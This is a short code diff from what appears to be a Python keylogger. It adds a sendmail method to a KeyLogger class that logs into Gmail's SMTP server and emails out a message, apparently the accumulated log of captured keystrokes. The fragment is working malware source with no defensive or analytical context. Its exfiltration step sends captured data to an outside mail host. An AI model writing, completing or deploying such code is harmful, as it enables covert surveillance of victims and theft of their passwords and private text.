@@ -39,3 +39,12 @@ class KeyLogger:
                 name = f"[{name.upper()}]"  # formatted string literals
 
         self.log += name  # add to total log
+
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages connection to SMTP server
+        server.starttls()  # connect to the SMTP server as TLS mode (for security)
+        server.login(email, password)  # login to email
+        server.sendmail(email, email, message)  # send the message
+        server.quit()  # end the session
+
+
